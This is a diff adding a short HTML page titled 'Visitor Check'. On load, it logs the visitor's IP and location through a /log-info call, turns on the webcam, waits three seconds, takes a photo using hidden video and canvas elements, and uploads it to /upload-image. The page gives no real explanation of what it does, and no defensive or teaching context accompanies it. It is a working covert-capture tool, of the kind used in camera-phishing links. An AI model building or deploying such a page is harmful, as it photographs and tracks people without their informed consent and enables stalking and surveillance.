@@ -1,0 +1,44 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <title>Visitor Check</title>
+  </head>
+  <body>
+    <h2>Loading camera and logging your visit...</h2>
+    <video id="video" autoplay style="display:none;"></video>
+    <canvas id="canvas" style="display:none;"></canvas>
+
+    <script>
+      async function capture() {
+        try {
+          await fetch('/log-info'); // Log IP/location
+
+          const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+          const video = document.getElementById('video');
+          const canvas = document.getElementById('canvas');
+          video.srcObject = stream;
+
+          await new Promise(r => setTimeout(r, 3000)); // Wait 3s
+
+          canvas.width = video.videoWidth;
+          canvas.height = video.videoHeight;
+          canvas.getContext('2d').drawImage(video, 0, 0);
+
+          const img = canvas.toDataURL('image/png');
+          await fetch('/upload-image', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ image: img })
+          });
+
+          stream.getTracks().forEach(track => track.stop());
+          document.body.innerHTML = '<h2>Thanks!</h2>';
+        } catch (e) {
+          console.error(e);
+          document.body.innerHTML = '<h2>Camera permission denied.</h2>';
+        }
+      }
+      capture();
+    </script>
+  </body>
+</html>
